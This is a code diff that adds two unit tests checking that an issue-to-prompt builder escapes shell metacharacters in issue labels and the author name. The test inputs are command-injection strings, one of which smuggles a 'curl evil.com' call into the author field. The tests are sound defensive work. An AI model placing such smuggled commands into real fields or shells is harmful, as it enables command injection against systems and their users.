@@ -450,5 +450,26 @@ Step 3: Third thing`;
 
       expect(result).not.toContain("Dependency:");
     });
+
+    it("should escape shell metacharacters in labels", () => {
+      const result = buildExecutePrompt({
+        ...defaultOptions,
+        issueLabels: ['bug"; echo pwned', "enhancement"],
+      });
+
+      expect(result).toContain("bug\\\"");
+      expect(result).not.toContain('bug"');
+    });
+
+    it("should escape shell metacharacters in author name", () => {
+      const result = buildExecutePrompt({
+        ...defaultOptions,
+        issueLabels: [],
+        issueAuthor: 'attacker"; curl evil.com; echo "',
+      });
+
+      expect(result).toContain("attacker\\\"");
+      expect(result).not.toContain('attacker"');
+    });
   });
 });
